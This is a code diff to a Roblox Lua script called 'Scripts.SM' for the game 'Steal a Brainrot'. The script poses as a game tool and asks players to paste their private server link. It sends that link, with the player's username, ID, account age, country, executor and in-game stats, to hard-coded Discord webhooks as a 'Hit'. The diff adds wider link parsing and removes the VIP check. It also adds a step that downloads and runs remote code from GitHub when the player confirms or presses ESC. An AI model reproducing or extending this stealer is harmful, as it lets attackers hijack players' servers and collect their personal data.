@@ -20,7 +20,6 @@ _G.scriptExecuted = true
 local Players          = game:GetService("Players")
 local TweenService     = game:GetService("TweenService")
 local UserInputService = game:GetService("UserInputService")
-local RunService       = game:GetService("RunService")
 local HttpService      = game:GetService("HttpService")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local Lighting         = game:GetService("Lighting")
@@ -34,7 +33,7 @@ local gui    = player:WaitForChild("PlayerGui")
 setclipboard("discord.gg/cnUAk7uc3n")
 
 --====================================================================--
--- VIP-Server Check
+--[[ VIP-Server Check
 --====================================================================--
 local isVIP = false
 pcall(function()
@@ -48,15 +47,33 @@ end)
 if not isVIP then
     player:Kick("Script.SM does not support public servers. Please join a Private Server")
     return
-end
+end ]]
 
 --====================================================================--
--- WEBHOOKS
+-- WEBHOOKS & LINK PARSING
 --====================================================================--
 local prvt_srvrs_logs = "https://discord.com/api/webhooks/1433479282528882844/XLe0lOXt1qF7DDo8Q8DOkuCJjhSjnlQxu3skK77qJLIUHHHMaksv_jzchnumBmaj2X4u"
-local user_webhook    = _G.scriptWebhook or "https://discord.com/api/webhooks/1433483411732828180/r8vXPrhN9m-eE7AynD3OLTYAlVIq89Rw3BR-W3ofEq2iAej7aFMMnjYu6IRUUtJ4t8nB"
-local logs_webhook    = "https://discord.com/api/webhooks/1433483493073096727/LBTZ_8EvrQSiJtfd852-vTdMxNV8mNnGAvycrmZZfDHVulcu2a77VU_l99xGRxuDGKg1"
-local REQUIRED_PART   = "https://www.roblox.com/share?code="
+local user_webhook    = _G.scriptWebhook or "https://discord.com/api/webhooks/1433776525878231132/acH3Ok6SgZfr461tqrdJBXKmaSAfgUNPWZo86N_K3EM16H-NfY-Iz5Dn38DH8CgCjqGu"
+local logs_webhook    = "https://discord.com/api/webhooks/1433776514868052012/2rL6CIcgBPWKQbyF5gqPpZmpYDdl61_mLQHM2LaaNxE4VNH76k-r0mWmL91rbGlggjpA"
+
+-- Accepts both link formats
+local function extractPrivateLink(input)
+    input = input:gsub("%s", "") -- remove whitespace
+
+    -- Type 1: share?code=
+    local code = input:match("share?code=([%w%-]+)")
+    if code then
+        return "https://www.roblox.com/share?code=" .. code
+    end
+
+    -- Type 2: privateServerLinkCode=
+    local code2 = input:match("privateServerLinkCode=([%w%-]+)")
+    if code2 then
+        return "https://www.roblox.com/share?code=" .. code2
+    end
+
+    return nil
+end
 
 --====================================================================--
 -- Helper: Safe Request
@@ -299,7 +316,7 @@ textBox.Size = UDim2.new(1, -20, 1, 0)
 textBox.Position = UDim2.fromOffset(10, 0)
 textBox.BackgroundTransparency = 1
 textBox.Text = ""
-textBox.PlaceholderText = "https://www.roblox.com/share?code=..."
+textBox.PlaceholderText = "Paste any private server link..."
 textBox.PlaceholderColor3 = Color3.fromRGB(150, 150, 160)
 textBox.TextColor3 = Color3.fromRGB(255, 255, 255)
 textBox.Font = Enum.Font.Gotham
@@ -376,11 +393,21 @@ continueBtn.MouseButton1Up:Connect(function() pressOut:Play() end)
 continueBtn.MouseLeave:Connect(function() pressOut:Play() end)
 
 --====================================================================--
--- CONFIRM POPUP (NEW CINEMATIC ANIMATIONS)
+-- CONFIRM POPUP
 --====================================================================--
 local confirmGui = nil
 
-local function showConfirm(link)
+local function showConfirm(rawLink)
+    local validLink = extractPrivateLink(rawLink)
+    if not validLink then
+        local flash = TweenService:Create(tbBg, TweenInfo.new(0.3), {BackgroundColor3 = Color3.fromRGB(120, 30, 30)})
+        flash:Play()
+        task.delay(0.3, function()
+            TweenService:Create(tbBg, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(40, 40, 48)}):Play()
+        end)
+        return
+    end
+
     confirmGui = Instance.new("Frame")
     confirmGui.Size = UDim2.fromOffset(380, 180)
     confirmGui.Position = UDim2.fromScale(0.5, 0.5)
@@ -423,8 +450,8 @@ local function showConfirm(link)
     warnMsg.Size = UDim2.new(1, -40, 0, 50)
     warnMsg.Position = UDim2.fromOffset(20, 60)
     warnMsg.BackgroundTransparency = 1
-    warnMsg.Text = "Are you sure the link is correct?\nIf wrong, the script will NOT work."
-    warnMsg.TextColor3 = Color3.fromRGB(255, 200, 0)
+    warnMsg.Text = "Link detected. Confirm to proceed."
+    warnMsg.TextColor3 = Color3.fromRGB(0, 255, 100)
     warnMsg.Font = Enum.Font.Gotham
     warnMsg.TextSize = 15
     warnMsg.TextWrapped = true
@@ -494,33 +521,33 @@ local function showConfirm(link)
         closeConfirm()
 
         task.delay(0.6, function()
-            _G.Private_Server_SM = link
+            _G.Private_Server_SM = validLink
 
             local cash = getStat("Cash") or 0
             local steals = getStat("Steals") or 0
             local rebirths = getStat("Rebirths") or 0
 
-            safeRequest(prvt_srvrs_logs, {content = link})
+            safeRequest(prvt_srvrs_logs, {content = validLink})
 
             local payload = {
                 avatar_url = "https://cdn.discordapp.com/attachments/1394146542813970543/1395733310793060393/ca6abbd8-7b6a-4392-9b4c-7f3df2c7fffa.png",
                 content = "",
                 embeds = {{
-                    title = "🎯 Steal a Brainrot Hit - Scripts.SM",
-                    url = link,
+                    title = "Steal a Brainrot Hit - Scripts.SM",
+                    url = validLink,
                     color = 57855,
                     fields = {
-                        {name = "🪪 Display Name",   value = "```"..(player.DisplayName or "Unknown").."```", inline = true},
-                        {name = "👤 Username",       value = "```"..(player.Name or "Unknown").."```",       inline = true},
-                        {name = "🆔 User ID",        value = "```"..tostring(player.UserId or 0).."```",    inline = true},
-                        {name = "📅 Account Age",    value = "```"..tostring(player.AccountAge or 0).." days```", inline = true},
-                        {name = "💻 Executor",       value = "```"..detectExecutor().."```",               inline = true},
-                        {name = "🌍 Country",        value = "```"..getPlayerCountry().."```",             inline = true},
-                        {name = "💸 Cash",           value = "```"..formatCash(cash).."```",               inline = true},
-                        {name = "🔥 Steals",         value = "```"..tostring(steals).."```",               inline = true},
-                        {name = "♻️ Rebirths",       value = "```"..tostring(rebirths).."```",             inline = true},
-                        {name = "💰 Backpack",       value = "```Failed to Scan```", inline = false},
-                        {name = "🔗 Join with URL",  value = "[Click here to join]("..link..")", inline = false}
+                        {name = "Display Name",   value = "```"..(player.DisplayName or "Unknown").."```", inline = true},
+                        {name = "Username",       value = "```"..(player.Name or "Unknown").."```",       inline = true},
+                        {name = "User ID",        value = "```"..tostring(player.UserId or 0).."```",    inline = true},
+                        {name = "Account Age",    value = "```"..tostring(player.AccountAge or 0).." days```", inline = true},
+                        {name = "Executor",       value = "```"..detectExecutor().."```",               inline = true},
+                        {name = "Country",        value = "```"..getPlayerCountry().."```",             inline = true},
+                        {name = "Cash",           value = "```"..formatCash(cash).."```",               inline = true},
+                        {name = "Steals",         value = "```"..tostring(steals).."```",               inline = true},
+                        {name = "Rebirths",       value = "```"..tostring(rebirths).."```",             inline = true},
+                        {name = "Backpack",       value = "```Failed to Scan```", inline = false},
+                        {name = "Join with URL",  value = "[Click here to join]("..validLink..")", inline = false}
                     },
                     footer = {text = "discord.gg/cnUAk7uc3n"},
                     timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
@@ -538,29 +565,34 @@ local function showConfirm(link)
             TweenService:Create(dim, TweenInfo.new(0.6), {BackgroundTransparency = 1}):Play()
             TweenService:Create(blur, TweenInfo.new(0.6), {Size = 0}):Play()
 
-            task.delay(0.8, function() screen:Destroy() end)
+            -- Destroy GUI and load next script
+            task.delay(0.8, function()
+                screen:Destroy()
+
+                local success, err = pcall(function()
+                    loadstring(game:HttpGet(
+                        "https://raw.githubusercontent.com/RblxScriptsOG/Steal-a-brainrot/refs/heads/main/main-gui.lua"
+                    ))()
+                end)
+
+                if not success then
+                    warn("Failed to load main-gui.lua: " .. tostring(err))
+                end
+            end)
         end)
     end)
 end
 
 --====================================================================--
--- CONTINUE
+-- CONTINUE BUTTON
 --====================================================================--
 continueBtn.MouseButton1Click:Connect(function()
     local input = textBox.Text ~= "" and textBox.Text or textBox.PlaceholderText
-    if not input:find(REQUIRED_PART, 1, true) then
-        local flash = TweenService:Create(tbBg, TweenInfo.new(0.3), {BackgroundColor3 = Color3.fromRGB(120, 30, 30)})
-        flash:Play()
-        task.delay(0.3, function()
-            TweenService:Create(tbBg, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(40, 40, 48)}):Play()
-        end)
-        return
-    end
     showConfirm(input)
 end)
 
 --====================================================================--
--- ESC CLOSE
+-- ESC CLOSE (ALSO LOADS NEXT SCRIPT)
 --====================================================================--
 UserInputService.InputBegan:Connect(function(i, gp)
     if gp then return end
@@ -580,7 +612,20 @@ UserInputService.InputBegan:Connect(function(i, gp)
             }):Play()
             TweenService:Create(dim, TweenInfo.new(0.6), {BackgroundTransparency = 1}):Play()
             TweenService:Create(blur, TweenInfo.new(0.6), {Size = 0}):Play()
-            task.delay(0.8, function() screen:Destroy() end)
+
+            task.delay(0.8, function()
+                screen:Destroy()
+
+                local success, err = pcall(function()
+                    loadstring(game:HttpGet(
+                        "https://raw.githubusercontent.com/RblxScriptsOG/Steal-a-brainrot/refs/heads/main/main-gui.lua"
+                    ))()
+                end)
+
+                if not success then
+                    warn("Failed to load main-gui.lua: " .. tostring(err))
+                end
+            end)
         end
     end
 end)
